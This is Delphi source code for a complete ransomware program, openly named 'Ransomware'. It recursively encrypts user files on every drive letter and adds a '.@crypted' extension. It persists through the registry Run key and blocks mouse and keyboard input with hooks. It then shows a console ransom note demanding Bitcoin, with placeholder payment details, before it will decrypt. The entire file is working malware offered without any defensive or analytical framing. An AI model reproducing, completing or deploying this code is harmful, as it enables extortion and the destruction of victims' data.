program Ransomware;

uses
  Windows, SysUtils, StrUtils, TNTSystem, uCryptoGear,
  uCryptoKey, uMouseHook, uKeyboardHook, Functions;

const
  ENCRYPTED_EXSTENSION = '.@crypted';
  MAX_FILE_SIZE = 512*1024*1024;
  EXCLUDED_EXTENSIONS: array [0..48] of String = ('', '.exe', ENCRYPTED_EXSTENSION, '.libary-ms', '.search-ms', '.inc', '.hpp', '.inf', '.ini', '.pif', '.tcl', '.lib', '.drv', '.url', '.db', '.pub', '.psp', '.lnk', '.dat', '.map', '.out', '.log', '.ilk', '.pdb', '.tlog', '.info', '.obj', '.pdb', '.ipch', '.dcu', '.lds', '.idb', '.pyo', '.pyc', '.whl', '.idx', '.loc', '.sys', '.cat', '.dmp', '.tmp', '.pma', '.ldb', '.old', '.sth', '.pb', '.dll', '.nls', '.mui');
  EXCLUDED_DIRECTORIES: array [0..39] of String = ('.', '..', '$Recycle.Bin', 'All Users', 'Public', 'Default', 'Application Data', 'Windows', 'Steam', 'Games', 'Windows Kits', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Google', 'Chrome', 'AMD', 'NVIDIA', 'NVIDIA Corporation', 'Unity', 'Microsoft', 'MicrosoftEdge', 'Packages', 'Intel', 'Boot', 'AppData', 'inc', 'include', 'lib', 'libs', 'libary', 'opt', 'libexec', 'lan', 'lang', 'lanuage', 'lanuages', 'eula', 'driver', 'drivers');

function GetConsoleWindow: HWND; stdcall; external kernel32;


//AsciiCallback
function AsciiCallback(Chr: Char): LRESULT;
begin
  SetForegroundWindow(GetConsoleWindow);
  if Ord(Chr) > 128 then Result := -1 else Result := 0;
end;
//AsciiCallback


//KeyboardCallback
function KeyboardCallback(vkCode, scanCode, flags: DWORD): LRESULT;
begin
  Result := -1;
end;
//KeyboardCallback


//BlockMovement
procedure BlockMovement;
var
  Msg: TMsg;
begin
  StartMouseHook(nil);
  BlockMouseMove(true);
  BlockLeftButton(true);
  BlockRightButton(true);
  BlockMiddleButton(true);
  BlockSideButton(true);
  BlockWheel(true);

  StartKeyboardHook;
  SetKeyboardCallback(KeyboardCallback);
  SetAsciiCallback(AsciiCallback);

  while GetMessage(Msg, 0,0,0) do begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
end;
//BlockMovement


//EncryptFile
procedure EncryptFile(srSearch: TWIN32FindDataW; FileName: WideString; Password: String);
var
  I: Integer;
  EnryptedName: WideString;
  ArrayOfByte: TByteArray;
  hFile, bytes: THandle;
  CryptoGear: CCryptoGear;
begin
  if ((srSearch.dwFileAttributes and faSysFile) <> 0) then Exit;
  if AnsiMatchText(ExtractFileExt(FileName), EXCLUDED_EXTENSIONS) then Exit;

  I := (srSearch.nFileSizeHigh * 4294967296) + srSearch.nFileSizeLow;
  if (I > MAX_FILE_SIZE) or (I <= 0) then Exit;

  if ((srSearch.dwFileAttributes and faReadOnly) <> 0) then if not SetFileAttributesW(PWideChar(FileName), 0) then Exit;
  EnryptedName := FileName + ENCRYPTED_EXSTENSION;
  if not MoveFileW(PWideChar(FileName), PWideChar(EnryptedName)) then Exit;

  hFile := CreateFileW(PWideChar(EnryptedName), GENERIC_ALL, FILE_SHARE_WRITE + FILE_SHARE_READ, nil, OPEN_EXISTING, 0,0);
  SetLength(ArrayOfByte, I);
  ReadFile(hFile, ArrayOfByte[0], I, bytes, nil);

  CryptoGear := CCryptoGear.Initialize(Password, MODE_ECB, 0);
  CryptoGear.Encrypt(ArrayOfByte);

  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  WriteFile(hFile, ArrayOfByte[0], Length(ArrayOfByte), bytes, nil);
  CloseHandle(hFile);
end;
//EncryptFile


//DecryptFile
procedure DecryptFile(srSearch: TWIN32FindDataW; FileName: WideString; Password: String);
var
  I: Integer;
  DecryptedName: WideString;
  ArrayOfByte: TByteArray;
  hFile, bytes: THandle;
  CryptoGear: CCryptoGear;
begin
  if ((srSearch.dwFileAttributes and faSysFile) <> 0) then Exit;
  if ExtractFileExt(FileName) <> ENCRYPTED_EXSTENSION then Exit;

  if ((srSearch.dwFileAttributes and faReadOnly) <> 0) then if not SetFileAttributesW(PWideChar(FileName), 0) then Exit;
  DecryptedName := Copy(FileName, 1, Length(FileName)-Length(ENCRYPTED_EXSTENSION));
  if not MoveFileW(PWideChar(FileName), PWideChar(DecryptedName)) then Exit;

  I := (srSearch.nFileSizeHigh * 4294967296) + srSearch.nFileSizeLow;
  hFile := CreateFileW(PWideChar(DecryptedName), GENERIC_ALL, FILE_SHARE_WRITE + FILE_SHARE_READ, nil, OPEN_EXISTING, 0,0);
  SetLength(ArrayOfByte, I);
  ReadFile(hFile, ArrayOfByte[0], I, bytes, nil);

  CryptoGear := CCryptoGear.Initialize(Password, MODE_ECB, 0);
  CryptoGear.Decrypt(ArrayOfByte);

  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  WriteFile(hFile, ArrayOfByte[0], Length(ArrayOfByte), bytes, nil);
  CloseHandle(hFile);
end;
//DecryptFile


//RecursivelyEncrypt
procedure RecursivelyEncrypt(Path: WideString; Password: String);
var
  srSearch: TWIN32FindDataW;
  hSearch: THandle;
begin
  hSearch := FindFirstFileW(PWideChar(Path + '\*.*'), srSearch);
  if hSearch <> INVALID_HANDLE_VALUE then begin
    repeat
      try
        if (((srSearch.dwFileAttributes and faDirectory) = 0))
          then EncryptFile(srSearch, (Path + '\' + srSearch.cFileName), Password);

        if ((srSearch.dwFileAttributes and faDirectory) = faDirectory) and (not AnsiMatchText(srSearch.cFileName, EXCLUDED_DIRECTORIES))
          then RecursivelyEncrypt((Path + '\' + srSearch.cFileName), Password);
      except
        Continue;
      end;
    until not FindNextFileW(hSearch, srSearch);
    Windows.FindClose(hSearch);
  end;
end;
//RecursivelyEncrypt


//RecursivelyDecrypt
procedure RecursivelyDecrypt(Path: WideString; Password: String);
var
  srSearch: TWIN32FindDataW;
  hSearch: THandle;
begin
  hSearch := FindFirstFileW(PWideChar(Path + '\*.*'), srSearch);
  if hSearch <> INVALID_HANDLE_VALUE then begin
    repeat
      try
        if (((srSearch.dwFileAttributes and faDirectory) = 0))
          then DecryptFile(srSearch, (Path + '\' + srSearch.cFileName), Password);

        if ((srSearch.dwFileAttributes and faDirectory) = faDirectory) and (not AnsiMatchText(srSearch.cFileName, EXCLUDED_DIRECTORIES))
          then RecursivelyDecrypt((Path + '\' + srSearch.cFileName), Password);
      except
        Continue;
      end;
    until not FindNextFileW(hSearch, srSearch);
    Windows.FindClose(hSearch);
  end;
end;
//RecursivelyDecrypt


//ShowRansomware
procedure ShowRansomware(Seed, Key: String);
var
  id: LongWord;
  S, DecryptedKey: String;
  i: Integer;
begin
  AllocConsole;
  SetConsoleTitle('Ransomware');
  DeleteMenu(GetSystemMenu(GetConsoleWindow, False), SC_CLOSE, MF_BYCOMMAND);
  SetWindowLong(GetConsoleWindow, GWL_STYLE, (GetWindowLong(GetConsoleWindow, GWL_STYLE) and -131073 and -65537));
  BeginThread(nil, 0, Addr(BlockMovement), nil, 0, id);

  WriteLn('Your ID: ', Seed);
  WriteLn('Your Key: ', Key, #13#10);

  S := 'Your files has been encrypted and if you want to recover them you will have to pay.' + #13#10 +
       'WARNING!!! Do not close or relaunch application or your files will be unrecovarable!' + #13#10 + #13#10 +
       '1. Buy Bitcoin (https://something.com)' + #13#10 +
       '2. Send amount of 0.02 BTC to address: xxxxxxxxxxxxxxxxxxxx' + #13#10 +
       '3. Transaction will take about 15-30 minutes to confirm.' + #13#10 +
       '4. When transaction is confirmed, send email to us at something@gmail.com' + #13#10 +
       '5. Write subject of your mail with: "Ransomware"' + #13#10 +
       '6. Write content of your mail with:' + #13#10 +
       '        Bitcoin Payment: (YOUR BITCOIN TRANSACTION ID)' + #13#10 +
       '        ID: (YOUR USER ID)' + #13#10 +
       '        KEY: (YOUR USER KEY)' + #13#10 +
       '7. We will contact you back with your password.' + #13#10;

  WriteLn(S);

  while EncryptKey(DecryptedKey, Seed) <> Key do begin
    Write('Enter password here: ');
    ReadLn(DecryptedKey);
  end;

  DeleteRegistryValue(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 'Ransomware');
  DeleteRegistryValue(HKEY_CURRENT_USER, 'Software\Ransomware', 'ID');
  DeleteRegistryValue(HKEY_CURRENT_USER, 'Software\Ransomware', 'Key');

  WriteLn(#13#10, 'Decrypting...');
  for i := 0 to 25 do RecursivelyDecrypt((Char(Ord('A') + i) + ':'), DecryptedKey);
  WriteLn('Done!', #13#10, 'Press any key to exit...');
  ReadLn;

  FreeConsole;
  SelfDelete;
end;
//ShowRansomware


var
  hMutex: THandle;
  Seed: String = '';
  Key: String = '';
  Password: String;
  i: Integer;
begin
  hMutex := CreateMutex(nil, False, 'Ransomware');
  if WaitForSingleObject(hMutex, 0) = WAIT_TIMEOUT then Exit;

  LoadRegistryString(Seed, HKEY_CURRENT_USER, 'Software\Ransomware', 'ID');
  LoadRegistryString(Key, HKEY_CURRENT_USER, 'Software\Ransomware', 'Key');
  if (Seed <> '') and (Key <> '') then ShowRansomware(Seed, Key);

  Password := RandomString(32, False);
  Seed := RandomString(32, False);
  Key := EncryptKey(Password, Seed);

  SaveRegistryWideString(WideParamStr(0), HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 'Ransomware');
  SaveRegistryString(Seed, HKEY_CURRENT_USER, 'Software\Ransomware', 'ID');
  SaveRegistryString(Key, HKEY_CURRENT_USER, 'Software\Ransomware', 'Key');

  for i := 0 to 25 do RecursivelyEncrypt((Char(Ord('A') + i) + ':'), Password);
  ReleaseMutex(hMutex);
  WideWinExec(WideParamStr(0), SW_SHOW);
end.
